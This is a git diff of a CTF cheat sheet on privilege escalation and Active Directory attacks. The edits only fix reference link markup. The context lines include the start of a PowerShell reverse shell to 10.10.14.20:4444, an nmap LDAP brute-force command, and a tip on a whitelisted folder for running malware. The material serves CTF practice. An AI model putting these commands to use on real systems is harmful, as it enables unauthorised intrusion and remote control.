@@ -11,7 +11,7 @@ This is a Cheat sheet with misc stuff that i have collected doing different CTF'
 
 A good reference for Windows local priv esc.
 
- <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a>
+<a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a>
 
 
 ### [](#header-3)Download files
@@ -53,11 +53,12 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.20",4444);$stream = 
 
 Domain enumeration.
 
-<a href>https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78</a>
+<a href="https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78" target="_blank">https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78</a>
 
 Active Directory.
 
-<a href>https://blog.stealthbits.com/category/active-directory/</a>
+<a href="https://blog.stealthbits.com/category/active-directory/" target="_blank">https://blog.stealthbits.com/category/active-directory/</a>
+
 
 ### [](#header-3)Recursive dir and searching in Windows
 
@@ -114,7 +115,7 @@ nmap -Pn -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cascad
 
 Python3 ldap_search for password spray.
 
-<a href>https://github.com/m8r0wn/ldap_search</a>
+<a href="https://github.com/m8r0wn/ldap_search" target="_blank">https://github.com/m8r0wn/ldap_search</a>
 
 
 ### [](#header-3)Powershell commands
@@ -153,7 +154,7 @@ Get-NetComputer -fulldata | select operatingsystem
 
 Recover LAPS passwords.
 
-<a href>https://secureidentity.se/recover-laps-passwords/</a>
+<a href="https://secureidentity.se/recover-laps-passwords/" target="_blank">https://secureidentity.se/recover-laps-passwords/</a>
 
 A good place to put and run malware from in Windows, usually whitelisted.
 
@@ -316,7 +317,7 @@ git clone https://github.com/wildkindcc/Exploitation.git
 
 g0tmi1k's guide to priv esc in Linux
 
-<a href>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>
+<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>
 
 
 ### [](#header-3)Simple shells
@@ -391,7 +392,7 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
 Compile exploits:
 
-<a href>https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c</a>
+<a href="https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c" target="_blank">https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c</a>
 
 Download a file with curl.
 
